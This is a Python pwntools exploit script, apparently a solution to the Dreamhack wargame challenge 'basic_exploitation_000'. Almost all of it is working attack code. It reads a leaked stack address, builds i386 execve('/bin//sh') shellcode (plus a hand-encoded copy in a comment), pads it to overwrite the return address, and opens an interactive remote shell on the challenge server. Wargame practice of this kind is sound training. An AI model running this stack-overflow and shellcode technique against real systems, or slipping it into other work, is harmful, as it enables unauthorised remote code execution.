#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./basic_exploitation_000',checksec=False)
context.arch = 'i386'


r = remote('host3.dreamhack.games',8674)
# r = process(exe.path)
# input()
r.recvuntil(b'buf = (')

addr = int(r.recv(10),16)
log.info("--- " + hex(addr))
shellcode = asm(
	'''
	xor eax,eax
	
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	push eax
	push ebx
	mov ecx,esp
	mov al,0x08
	inc al
	inc al
	inc al

	int 0x80
	'''

	)
print(len(shellcode))
# shellcode = b"\x31\xC0\x99\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"

payload =shellcode
payload = payload.ljust(0x84,b'A') + p32(addr)

r.sendline(payload)

r.interactive()